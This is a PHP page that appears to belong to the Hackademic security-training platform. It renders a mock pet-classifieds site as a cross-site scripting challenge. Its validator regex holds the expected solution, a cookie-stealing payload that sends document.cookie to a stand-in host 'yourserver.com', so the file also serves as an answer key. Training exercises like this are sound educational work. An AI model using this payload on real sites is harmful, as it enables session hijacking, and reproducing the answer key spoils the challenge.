<?php

include_once dirname(__FILE__).'/../../init.php';
session_start();
require_once(HACKADEMIC_PATH."controller/class.ChallengeValidatorController.php");

$solution = new RegexSolution('document\.location(\.href)? ?= ?"http:\/\/yourserver\.com\/\?c=" ?\+ ?document\.cookie');
$validator = new ChallengeValidatorController($solution);
$validator->startChallenge();

?>
<!DOCTYPE html>
<html lang="fr">
<head>
	<meta charset="iso-8859-15">
	<link rel="icon" href="data/logo.png"/>
	<link href="data/style1.css" rel="stylesheet" type="text/css">
	<title>Sell your pet!</title>
</head>
<body id="all" class="ua_FIR">
	<div id="weboScriptSync"></div>
	<div class="page_align" id="page_align">
		<div class="page_width" id="page_width">
			<div id="ContainerMain">
				<div id="account_login_f">
					<div id="screen_form" class="account_screen">
						<div class="form_container">
							<form id="account_login_form" name="loginform" method="post">
								<div class="form_el name">Email</div>
								<div class="form_el input">
									<input name="email" type="text">
								</div>
								<div class="form_el pass">Password</div>
								<div class="form_el input">
									<input name="password" type="password">
								</div>
								<div class="form_el submit_ok">
									<input value="ok" type="submit">
								</div>
								<div class="clearer"></div>
							</form>
						</div>
						<div class="clearer"></div>
						<div id="lost_passwd">
							<div class="left_float create_acc">
							<?php
								if(isset($_POST['email']) && isset($_POST['password'])) {
									echo '<span style="color: red;">&nbsp;&nbsp;&nbsp;&nbsp;Wrong password! </span>';
								}
							?>
							</div>
							<div class="left_float lost_pwd">
								<a href="#">&gt; Forgot your password?</a>
							</div>
							<div class="clearer"></div>
						</div>
					</div>
					<div id="pass_lost_f" class="account_screen">
						<div class="form_container">
							<form id="pass_lost_form" name="passlostform" method="post">
								<div class="form_el name">Enter your password and validate to reinitialize your password.</div>
								<div class="form_el input">
									<input name="ar_email" type="text">
								</div>
								<div class="form_el submit_ok">
									<input value="ok" type="submit">
								</div>
								<div class="clearer"></div>
							</form>
						</div>
						<div class="clearer"></div>
						<div id="lost_passwd_cancel">
							<a href="#">&lt; Back</a>
						</div>
					</div>
					<div id="create_acc_f" class="account_screen">
						<div id="create_acc_head">You are:</div>
						<div class="form_container">
							<div class="left_float create_part">
								<a href="#" class="create_acc_link">Individual</a>
							</div>
							<div class="left_float create_pro">
								<a href="#" class="create_acc_link">Professional</a>
							</div>
							<div class="clearer"></div>
						</div>
						<div class="clearer"></div>
						<div id="create_acc_cancel">
							<a href="#">&lt; Back</a>
						</div>
					</div>
				</div>
				<header id="headermain">
					<a href="#">
						<img src="data/logo.png" height="80px" title="Sell your pet!" alt="Sell your pet!" id="header_logo">
					</a>
				</header>
				<nav>
					<ul id="nav_main" class="navmain">
						<li class="accueil">
							<a href="index.php">Home</a>
						</li>
						<li class="deposer">
							<a href="place-your-ad.php">Place an ad</a>
						</li>
						<li class="offre selected">
							<a href="index.php">Ads</a>
						</li>
						<li class="mes_annonces">
							<a id="link_adwatch" href="#">My ads</a>
						</li>
						<li class="compte_pro">
							<a href="#">My account</a>
						</li>
						<li class="aide">
							<a href="#">Help</a>
						</li>
					</ul>
				</nav>
				<div id="account_submenu">
					<div class="account_submenu_arrow"></div>
					<ul class="account_submenu_ul">
						<li>
							<a href="#">Individual</a>
						</li>
						<li class="li_sep"></li>
						<li>
							<a href="#">Professional</a>
						</li>
					</ul>
				</div>
				<div class="search_box">
					<form id="search_form" name="f" method="get">
						<div id="search">
							<div id="searchmain">
								<div class="select-and-link">
									<input name="q" size="30" id="searchtext" class="searchtext" type="text">
									<div class="search_select search_category">
										<select name="c" id="search_category" class="search_category">
											<option value="0" selected="selected">All categories</option>
											<option value="1">Cat</option>
											<option value="2">Dog</option>
											<option value="8">Fish</option>
											<option value="4">Horse</option>
											<option value="5">Guinea pig</option>
											<option value="6">Mouse</option>
											<option value="7">Parrot</option>
											<option value="3">Snake</option>
										</select>
									</div>
									<div class="search_select searcharea">
										<select name="w" id="searcharea" class="searcharea">
											<option value="1" selected="selected">All countries</option>
											<option value="193">Canada</option>
											<option value="3">France</option>
											<option value="191">Germany</option>
											<option value="178">Great Britain</option>
											<option value="177">Greece</option>
											<option value="194">Ireland</option>
											<option value="192">Italy</option>
											<option value="195">Netherlands</option>
											<option value="175">Spain</option>
											<option value="2">USA</option>
										</select>
									</div>
									<div class="clear"></div>
									<div id="titlesearch">
										<input id="ctitle" name="it" value="1" type="checkbox"> 
										<label for="ctitle">Search in the title only</label>
									</div>
									<div class="clear"></div>
								</div>
								<div class="location"></div>
								<div id="location_hints_box">
									<ul>
										<li></li>
									</ul>
									<div id="location_hints_box_close">
										<a>Close x</a>
									</div>
								</div> 
								<div class="zipcode_search" id="zipcode" style="display: block;"></div>
								<div class="clear"></div>
							</div>
							<div class="searchbutton_zone">
								<input id="searchbutton" value="Search" type="submit">
								<div class="clear"></div>
							</div>
						</div>
						<input id="dn" type="hidden">
					</form>
					<div class="clear"></div>
				</div>
				<div class="clear"></div>
				<div class="oas-x01" id="oas-x01"></div>
				<div class="oas-x02" id="oas-x02"></div>
				<div class="oas-x03" id="oas-x03"></div>
				<div class="oas-x04" id="oas-x04"></div>
				<div class="clear"></div>
				<div class="clear"></div>
				<div class="list">
					<div class="content-color">
						<div class="list-lbc">
							<a href="#">
								<div class="lbc">
									<div class="date">
										<div>Yesterday</div>
										<div>17:37</div>
									</div>
									<div class="image">
										<div class="image-and-nb">
											<img src="data/canadian_horse.jpg" height="120px">
											<div class="nb">
												<div class="top radius">&nbsp;</div>
												<div class="value radius">2</div>
											</div>
										</div>
									</div>
									<div class="detail">
										<div class="title">French Canadian horse</div>
										<div class="category">Horse</div>
										<div class="placement">Canada</div>
										<div class="price">15 000&nbsp;</div>
									</div>
									<div class="clear"></div>
								</div>
							</a>
							<div class="clear"></div>
							<a href="#">
								<div class="lbc">
									<div class="date">
										<div>Yesterday</div>
										<div>16:36</div>
									</div>
									<div class="image">
										<div class="image-and-nb">
											<img src="data/parrot.jpg"  height="120px">
											<div class="nb">
												<div class="top radius">&nbsp;</div>
												<div class="value radius">3</div>
											</div>
										</div>
									</div>
									<div class="detail">
										<div class="title">Monk Parakeet</div>
										<div class="category">Parrot</div>
										<div class="placement">Spain</div>
										<div class="price">500&nbsp;</div>
									</div>
									<div class="clear"></div>
								</div>
							</a>
							<div class="clear"></div>
							<a href="#">
								<div class="lbc">
									<div class="date">
										<div>Yesterday</div>
										<div>15:11</div>
									</div>
									<div class="image">
										<div class="image-and-nb">
											<img src="data/frenchbulldog.jpg" height="120px">
											<div class="nb">
												<div class="top radius">&nbsp;</div>
												<div class="value radius">3</div>
											</div>
										</div>
									</div>
									<div class="detail">
										<div class="title">French bulldog</div>
										<div class="category">Dog</div>
										<div class="placement">France</div>
										<div class="price">100&nbsp;</div>
									</div>
									<div class="clear"></div>
								</div>
							</a>
							<div class="clear"></div>
							<a href="#">
								<div class="lbc">
									<div class="date">
										<div>Yesterday</div>
										<div>15:06</div>
									</div>
									<div class="image">
										<div class="image-and-nb">
											<img src="data/asian_cat.jpg" height="120px">
											<div class="nb">
												<div class="top radius">&nbsp;</div>
												<div class="value radius">3</div>
											</div>
										</div>
									</div>
									<div class="detail">
										<div class="title">Asian Semi-longhair cat</div>
										<div class="category">Cat</div>
										<div class="placement">France</div>
										<div class="price">25&nbsp;</div>
									</div>
									<div class="clear"></div>
								</div>
							</a>
							<div class="clear"></div>
							<a href="#">
								<div class="lbc">
									<div class="date">
										<div>Yesterday</div>
										<div>14:34</div>
									</div>
									<div class="image">
										<div class="image-and-nb">
											<img src="data/pitbull_fishes.jpg" height="120px">
											<div class="nb">
												<div class="top radius">&nbsp;</div>
												<div class="value radius">3</div>
											</div>
										</div>
									</div>
									<div class="detail">
										<div class="title">Pitbull fishes</div>
										<div class="category">Fish</div>
										<div class="placement">Italy</div>
										<div class="price">200&nbsp;</div>
									</div>
									<div class="clear"></div>
								</div>
							</a>
							<div class="clear"></div>
							<a href="#">
								<div class="lbc">
									<div class="date">
										<div>Yesterday</div>
										<div>14:00</div>
									</div>
									<div class="image">
										<div class="image-and-nb">
											<img src="data/snake.jpg" height="120px">
											<div class="nb">
												<div class="top radius">&nbsp;</div>
												<div class="value radius">1</div>
											</div>
										</div>
									</div>
									<div class="detail">
										<div class="title">Beautiful snake</div>
										<div class="category">Snake</div>
										<div class="placement">Greece</div>
										<div class="price">1 000&nbsp;</div>
									</div>
									<div class="clear"></div>
								</div>
							</a>
							<div class="clear"></div>
							<a href="#">
								<div class="lbc">
									<div class="date">
										<div>Yesterday</div>
										<div>12:05</div>
									</div>
									<div class="image">
										<div class="image-and-nb">
											<img src="data/alpaca.jpg" height="120px">
											<div class="nb">
												<div class="top radius">&nbsp;</div>
												<div class="value radius">3</div>
											</div>
										</div>
									</div>
									<div class="detail">
										<div class="title">Alpaca guinea pig</div>
										<div class="category">Guinea pig</div>
										<div class="placement">Germany</div>
										<div class="price">80&nbsp;</div>
									</div>
									<div class="clear"></div>
								</div>
							</a>
							<div class="clear"></div>
							<a href="#">
								<div class="lbc">
									<div class="date">
										<div>Yesterday</div>
										<div>11:22</div>
									</div>
									<div class="image">
										<div class="image-and-nb">
											<img src="data/arabian_horse.jpg" height="120px">
											<div class="nb">
												<div class="top radius">&nbsp;</div>
												<div class="value radius">3</div>
											</div>
										</div>
									</div>
									<div class="detail">
										<div class="title">Arabian horse</div>
										<div class="category">Horse</div>
										<div class="placement">Great Britain</div>
										<div class="price">32 000&nbsp;</div>
									</div>
									<div class="clear"></div>
								</div>
							</a>
							<div class="clear"></div>
							<a href="#">
								<div class="lbc">
									<div class="date">
										<div>Yesterday</div>
										<div>10:41</div>
									</div>
									<div class="image">
										<div class="image-and-nb">
											<img src="data/four-toes-jerboa.jpg" height="120px">
											<div class="nb">
												<div class="top radius">&nbsp;</div>
												<div class="value radius">1</div>
											</div>
										</div>
									</div>
									<div class="detail">
										<div class="title">Four toes jerboa</div>
										<div class="category">Mouse</div>
										<div class="placement">Spain</div>
										<div class="price">200&nbsp;</div>
									</div>
									<div class="clear"></div>
								</div>
							</a>
							<div class="clear"></div>
						</div>
						<div class="list-gallery">
							<div class="gallery-zone">
								<div class="background">
									<div class="title">
										<span>Top Ads</span>
									</div>
									<a href="#">
										<div class="gallery-block">
											<div class="image">
												<img src="data/parrot.jpg" height="120px">
											</div>
											<div class="title">Monk Parakeet</div>
											<div class="price-or-urgent">
												<span class="price">500&nbsp;</span>
												<span class="urgent">&#9733;&nbsp;Urgent</span>
											</div>
										</div>
									</a>
									<a href="#">
										<div class="gallery-block">
											<div class="image">
												<img src="data/arabian_horse.jpg" height="120px">
											</div>
											<div class="title">Arabian horse</div>
											<div class="price-or-urgent">
												<span class="price">32 000&nbsp;</span>
											</div>
										</div>
									</a>
									<a href="#">
										<div class="gallery-block">
											<div class="image">
												<img src="data/snake.jpg" height="120px">
											</div>
											<div class="title">Beautiful snake</div>
											<div class="price-or-urgent">
												<span class="price">1 000&nbsp;</span>
											</div>
										</div>
									</a>
								</div>
								<a class="en-savoir-plus" href="#">En savoir plus</a>
								<div class="title-triangle left">&nbsp;</div>
								<div class="title-triangle right">&nbsp;</div>
							</div>
						</div>
						<div class="clear"></div>
						<style type="text/css">
							#afs-main {
								width: 635px;
								margin-left: -20px;
								border-top: 1px solid #CCC;
								padding: 10px 0 0 110px;
							}

							#afs-container { 
								width: 439px;
								padding-left: 196px;
							}

							#afs-attribution {
								float: left;
								padding-top: 6px;
								margin-left: -89px;
							}

							#afs-attribution a {
								font-weight: normal;
							}

							#afs-attribution a:link, #afs-attribution a:visited { 
								color: black;
							}
						</style>
					</div>
				</div>
				<br>
				<nav>
					<ul class="paging left-20" id="paging">
						<li>&lt;&lt;</li>
						<li class="page">Previous page</li>
						<li class="selected">1</li>
						<li>
							<a href="#">2</a>
						</li>
						<li>
							<a href="#">3</a>
						</li>
						<li>	
							<a href="#">4</a>
						</li>
						<li>
							<a href="#">5</a>
						</li>
						<li>
							<a href="#">6</a>
						</li>
						<li>
							<a href="#">7</a>
						</li>
						<li>	
							<a href="#">8</a>	
						</li>
						<li>
							<a href="#">9</a>
						</li>
						<li>
							<a href="#">10</a>
						</li>
						<li>
							<a href="#">11</a>
						</li>
						<li>
							<a href="#">12</a>
						</li>
						<li>
							<a href="#">13</a>
						</li>
						<li>	
							<a href="#">14</a>
						</li>
						<li>
							<a href="#">15</a>
						</li>
						<li>	
							<a href="#">16</a>	
						</li>
						<li>	
							<a href="#">17</a>
						</li>
						<li>
							<a href="#">18</a>
						</li>
						<li>
							<a href="#">19</a>
						</li>
						<li>
							<a href="#">20</a>	
						</li>
						<li class="page">
							<a href="#">Next page</a>
						</li>
						<li>
							<a href="#">&gt;&gt;</a>
						</li>
					</ul>
				</nav>
				<div class="clear"></div>
				<nav>
					<div id="footer">
						<a id="footer_cgu_link" href="#">Legal&nbsp;notice</a>
						<a id="footer_who_link" href="#">Who&nbsp;are&nbsp;we?</a>
						<a id="footer_contact_link" href="#">Contact</a>
						<a id="footer_recrut_link" href="#">Careers</a>
						<a href="#">Ads</a>
						<a id="footer_pack_immo_link" href="#">Real&nbsp;estate&nbsp;professional</a>
						<a id="footer_mobile_link" href="#">Mobile</a>
						<a id="footer_rules_link" href="#">Diffusion&nbsp;rules</a>
						<br>
						<a id="footer_cgv_link" href="#">Terms&nbsp;and&nbsp;Conditions</a>
						<a id="footer_bookmark_link" href="#">Add&nbsp;to&nbsp;my&nbsp;favorites</a>
						<a id="footer_cookies_link" class="Link" href="#">Your&nbsp;cookies</a>
					</div>
				</nav>
				<img src="data/hit.png" height="1" width="1">
			</div>
		</div>
	</div>
	<div id="ui-datepicker-div" class="ui-datepicker ui-widget ui-widget-content ui-helper-clearfix ui-corner-all"></div>
	<div id="cdx"></div>
</body>
</html>
